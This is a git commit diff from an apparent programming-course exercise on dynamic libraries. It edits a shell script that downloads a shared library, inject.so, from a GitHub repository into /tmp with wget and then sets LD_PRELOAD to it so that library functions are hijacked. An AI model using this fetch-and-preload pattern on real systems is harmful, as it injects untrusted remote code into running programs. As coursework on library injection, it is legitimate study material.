b33eed5b6f323cc03b87acf6830e80029947b198
A-fethi <fethiabderrahmane1@gmail.com>
2023-06-19 09:08:45 -0700

    injection code

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp https://github.com/A-fethi/alx-low_level_programming/tree/master/0x18-dynamic_libraries/inject.so
+wget -P /tmp https://github.com/A-fethi/alx-low_level_programming/raw/master/0x18-dynamic_libraries/inject.so
 export LD_PRELOAD=/tmp/inject.so
